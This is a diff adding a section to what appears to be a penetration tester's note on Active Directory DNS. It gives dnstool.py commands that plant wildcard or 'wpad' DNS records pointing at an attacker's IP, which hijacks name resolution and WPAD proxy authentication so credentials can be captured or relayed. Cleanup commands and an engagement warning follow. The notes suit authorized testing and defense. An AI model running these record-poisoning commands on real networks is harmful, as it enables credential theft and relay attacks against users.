@@ -107,6 +107,25 @@ grep -i "azure\|aws\|gcp\|blob\|s3" records.csv
 
 ---
 
+## Write Side — Hijack Name Resolution (`dnstool.py`)
+
+Enumeration is recon; the *attack* is **adding** a record. In most AD-integrated DNS zones **any authenticated user can create records** (default ACL), so you can plant a `*` wildcard or a `wpad` entry pointing at your box → funnel name resolution / WPAD proxy auth to you, then relay/capture. `dnstool.py` ships in dirkjanm's **krbrelayx** repo (same author as adidnsdump):
+
+```bash
+# Add a wildcard A record → you answer for any name the client can't otherwise resolve
+dnstool.py -u 'DOMAIN\user' -p 'Password' --record '*' --action add --type A --data <attacker-ip> <dc-ip>
+
+# Or plant WPAD specifically (many envs block the LLMNR/NBNS path but leave ADIDNS open)
+dnstool.py -u 'DOMAIN\user' -p 'Password' --record 'wpad' --action add --type A --data <attacker-ip> <dc-ip>
+
+# Clean up when done
+dnstool.py -u 'DOMAIN\user' -p 'Password' --record 'wpad' --action remove --type A --data <attacker-ip> <dc-ip>
+```
+
+> [!warning] A wildcard record is **domain-wide and noisy** — it changes resolution for every client. Prefer a specific record (`wpad`, a single target host) on real engagements; coordinate/clean up, and note that ADIDNS records replicate and are visible in the same `dnsNode` objects you dumped above.
+
+---
+
 ## Alternative — Manual ldapsearch
 
 ```bash
@@ -125,5 +144,5 @@ ldapsearch -x -H ldap://<dc-ip> \
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
